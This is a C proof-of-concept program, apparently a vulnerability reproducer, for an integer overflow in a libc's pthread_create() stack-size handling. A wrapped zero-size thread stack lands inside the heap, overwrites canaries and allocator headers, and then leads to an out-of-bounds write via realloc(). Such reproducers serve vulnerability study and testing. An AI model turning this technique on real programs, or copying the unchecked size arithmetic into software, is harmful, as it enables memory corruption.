/* pagh-libc 0.15.3 pthread_create(): the stack size is rounded up without any
 * overflow check, so a caller-provided (untrusted) stack size near SIZE_MAX
 * wraps to ZERO.  malloc(0) then returns a 16-byte header block, the kernel's
 * clone() stack contract only requires the page at sp-16 to be mapped user
 * RW (it is: the program heap), and the new thread starts with sp pointing at
 * the *next* allocation's header.  Every push of the thread prologue and of
 * the thread body then grows downward over the preceding live heap blocks:
 * the zero-byte "stack" is inside the allocator's heap.
 *
 * The program proves the overwrite with canaries in two live blocks that were
 * allocated immediately before the thread stack, and then asks realloc() to
 * grow one of those blocks: the block header was overwritten by the thread
 * stack, so realloc() trusts a bogus old size.
 *
 * Victim shape: a program that creates a thread with a stack size taken from
 * its input (config/request/depth*frame_size) and never checks it.
 */
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define VICTIM_BYTES 64
#define CANARY 0x5A

static unsigned char *victim1;
static unsigned char *victim2;

static int changed(const unsigned char *p, int n) {
    int hits = 0;
    for (int i = 0; i < n; i++) {
        if (p[i] != CANARY) hits++;
    }
    return hits;
}

static int first_changed(const unsigned char *p, int n) {
    for (int i = 0; i < n; i++) {
        if (p[i] != CANARY) return i;
    }
    return -1;
}

/* A normal thread body: one 1 KiB local buffer.  Nothing here is attacker
 * code; it is the same `worker` shape as examples/threads.c. */
static void *worker(void *arg) {
    (void)arg;
    volatile unsigned char buf[1024];
    for (unsigned i = 0; i < sizeof buf; i++) {
        buf[i] = 0xAA;
    }
    return buf[0] == 0xAB ? (void *)1 : (void *)0;
}

int main(void) {
    /* Two small live blocks, then the thread stack right after them. */
    victim1 = malloc(VICTIM_BYTES);
    victim2 = malloc(VICTIM_BYTES);
    if (!victim1 || !victim2) {
        printf("PTHREAD ALLOC FAILED\n");
        return 1;
    }
    memset(victim1, CANARY, VICTIM_BYTES);
    memset(victim2, CANARY, VICTIM_BYTES);

    pthread_attr_t attr;
    pthread_attr_init(&attr);

    /* The untrusted "stack size".  (size_t)-1 + 4095 wraps, and the
     * round-down to 4096 makes it exactly zero. */
    size_t requested = (size_t)-1;
    pthread_attr_setstacksize(&attr, requested);
    printf("REQUESTED STACK SIZE %lu\n", (unsigned long)requested);

    pthread_t thread;
    int rc = pthread_create(&thread, &attr, worker, NULL);
    printf("PTHREAD CREATE rc=%d\n", rc);
    if (rc != 0) {
        printf("PTHREAD STACK REFUSED\n");
        return 2;
    }
    pthread_join(thread, NULL);

    int hits1 = changed(victim1, VICTIM_BYTES);
    int hits2 = changed(victim2, VICTIM_BYTES);
    int at1 = first_changed(victim1, VICTIM_BYTES);
    int at2 = first_changed(victim2, VICTIM_BYTES);
    printf("VICTIM1 changed=%d/%d first=%d\n", hits1, VICTIM_BYTES, at1);
    printf("VICTIM2 changed=%d/%d first=%d\n", hits2, VICTIM_BYTES, at2);
    if (hits1 == 0 && hits2 == 0) {
        printf("CANARY OK\n");
        return 0;
    }

    /* The thread stack wrote through the block headers.  A 64-byte block now
     * reports whatever the stack left in its 16-byte header; if that is a
     * huge value, realloc() treats the grow as a shrink and hands back the
     * undersized block. */
    unsigned char *grown = realloc(victim1, 4096);
    if (grown == victim1) {
        printf("REALLOC TRUSTED CORRUPTED HEADER (64-byte block grows in place)\n");
        memset(grown, 0xBB, 4096); /* the caller now owns 0 bytes of it */
        printf("OVERFLOW WRITE DONE\n");
    } else {
        printf("REALLOC MOVED THE BLOCK (header was corrupted to a small value)\n");
    }
    printf("HEAP METADATA CORRUPTED BY ZERO-SIZE THREAD STACK\n");
    return 3;
}